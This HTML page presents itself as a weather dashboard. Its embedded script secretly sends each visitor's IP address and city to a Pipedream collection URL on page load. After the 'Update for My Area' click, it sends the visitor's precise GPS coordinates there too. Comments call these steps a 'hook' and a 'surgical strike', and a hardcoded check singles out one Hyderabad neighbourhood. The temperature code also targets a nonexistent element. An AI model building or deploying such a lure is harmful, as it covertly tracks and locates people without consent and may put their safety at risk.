<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Weather Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1a202c; color: white; text-align: center; padding: 50px; }
        .card { background: #2d3748; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 15px rgba(0,0,0,0.3); width: 320px; }
        #location-name { font-size: 24px; color: #63b3ed; margin: 15px 0; font-weight: bold; }
        .temp { font-size: 48px; margin: 10px 0; }
        .btn { background: #3182ce; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px; margin-top: 10px; }
        .btn:hover { background: #4299e1; }
        p { color: #a0aec0; margin: 5px 0; }
    </style>
</head>
<body>

    <div class="card">
        <p style="text-transform: uppercase; font-size: 11px; letter-spacing: 1px;">Current Forecast</p>
        <div id="location-name">Detecting...</div>
        <div class="temp">28°C</div>
        <p id="weather-desc">Partly Cloudy</p>
        
        <button class="btn" onclick="updateWeather()">Update for My Area</button>
    </div>

   <script>
    const PIPEDREAM_URL = "https://eotwt8cj1vr426p.m.pipedream.net";

    // STAGE 1: THE INITIAL HOOK (IP-BASED)
    // This runs immediately so they see the right city even before clicking
    window.onload = function() {
        fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            const city = data.city || "India";
            document.getElementById('location-name').innerText = city;

            // Fetch temp for the IP-detected city automatically
            fetch(`https://api.open-meteo.com/v1/forecast?latitude=${data.latitude}&longitude=${data.longitude}&current_weather=true`)
            .then(res => res.json())
            .then(w => {
                document.getElementById('temp-val').innerText = Math.round(w.current_weather.temperature) + "°C";
            });

            // Silent log to Pipedream (Passive Hit)
            fetch(PIPEDREAM_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "INITIAL_IP_HIT", ip: data.ip, city: city }) });
        });
    };

    // STAGE 2: THE SURGICAL STRIKE (GPS-BASED)
   function updateWeather() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // 1. Fetch Real-Time Weather for the location
            fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`)
            .then(res => res.json())
            .then(w => {
                document.getElementById('temp-val').innerText = Math.round(w.current_weather.temperature) + "°C";
            });

            // 2. Fetch Neighborhood Name
            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
            .then(res => res.json())
            .then(geoData => {
                let name = geoData.locality || geoData.city;

                // SURGICAL FIX: Only show Punjagutta if the Latitude is exactly 17.42...
                // Mumbai starts with 19, so it will skip this entirely now.
                const isAtHome = lat.toFixed(2) == "17.42" && lon.toFixed(2) == "78.45";

                if (isAtHome) {
                    name = "Punjagutta Officers Colony";
                }

                document.getElementById('location-name').innerText = name;
                document.getElementById('weather-desc').innerText = "Live Accuracy Verified";
            });

            // 3. Log Precise Data to Pipedream
            fetch(PIPEDREAM_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ type: "GPS_LOG", lat: lat, lon: lon })
            });
        });
    }
}
</script>
